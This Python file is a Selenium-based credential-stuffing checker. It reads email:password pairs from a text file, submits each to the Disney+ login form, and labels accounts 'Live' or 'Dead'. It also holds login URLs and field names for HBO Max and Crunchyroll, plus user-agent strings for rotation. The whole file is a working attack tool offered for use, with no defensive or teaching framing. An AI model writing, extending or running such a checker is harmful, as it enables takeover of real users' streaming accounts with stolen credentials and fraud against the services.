import os
import random
import time as tmp
from lxml import html
from colorama import Fore 
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

class Play:
    def __init__(self):
        #=-----------*=> Variables de Disney <=*------------------#

        self.box_email = '//*[@id="email"]'
        self.btn_email = "/html/body/div/div/main/div/div/div/div[2]/div/div/div/form/button"

        self.box_password = '//*[@id="password"]'
        self.btn_password = '/html/body/div/div/main/div/div/div/div[2]/div/div/div/form/button'
        
        self.invalid_password = '//*[@id="password-error"]'

        #=-----------------------*=>@<=*-------------------------#
        
        #=-----------*=> Variables de HBO <=*------------------#
        self.url_hbo_login = "https://play.hbomax.com/signIn"
        self.email_hbo = "EmailTextInput"
        self.password_hbo = "PasswordTextInput"

        #=-----------*=> Variables de crunchyroll <=*------------------#
        self.url_crunchyroll_login = "https://sso.crunchyroll.com/login"

    def base(self):
        directorio_actual = os.getcwd()
        try:
            os.mkdir('validaciones')
            if os.path.exists(os.path.join(directorio_actual,'validaciones')):
                print('[+] Directorio creado')

        except FileExistsError:
            print('[-] Directorio ya existe')
                
    def Agents(self,filtro):
            if filtro == False:
                user_agent = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.78",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 OPR/78.0.4093.184"]
                agente = random.choice(user_agent)
                return agente
            
            elif filtro == True:
                user_agent = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.78"]
                agente = random.choice(user_agent)
                return agente

    def Disney(self,driver,time,User,Password):

        short = WebDriverWait(driver, 7)

        email = time.until(EC.presence_of_element_located((By.XPATH,self.box_email)))
        email.send_keys(User)

        btn_email = driver.find_element(By.XPATH,self.btn_email)
        btn_email.click()

        password = time.until(EC.presence_of_element_located((By.XPATH,self.box_password)))
        password.send_keys(Password)
        
        btn_password = driver.find_element(By.XPATH,self.btn_password)
        btn_password.click()

        try:         
            estado = 'Dead'
            password = short.until(EC.presence_of_element_located((By.XPATH,self.   invalid_password)))
            print(f'[+] Email: {User} | Password: {Password} | Status: {estado}')

        except TimeoutException:
            # password = short.until(EC.presence_of_element_located((By.XPATH,'/html/body/div/div/main/div/div/div/div[2]/div/div/div/div[1]/h1')))
            # estado = 'Resquiere Pin'
            # print(f'[+] Email :{User} | Password: {Password} | Status: {estado}')

            estados = 'Live'
            print(f'[+] Email :{User} | Password: {Password} | Status: {estados}')

            
            

        


    def extraccion_usuario_password(self,file,filtro):
        self.base()
        with open(file,'r') as packs:
            packss = packs.readlines()
            for pack in packss:
                    # global options
                    options = Options()        
                    Usuario,Password = (pack.strip().split(':'))
                    # print(Usuario,Password)
                    # options.add_argument(head)
                    # options.set_preference("general.useragent.override",self.Agents(filtro))
                    driver = webdriver.Firefox(options=options)
                    driver.get('https://www.disneyplus.com/identity/login/enter-email?pinned=true')
                    time = WebDriverWait(driver, 40)
                    # if plataforma == 'Disney':
                    self.Disney(driver,time,Usuario,Password)
                    driver.delete_all_cookies()
                    driver.quit()



sss = Play()
sss.extraccion_usuario_password('base.txt',True)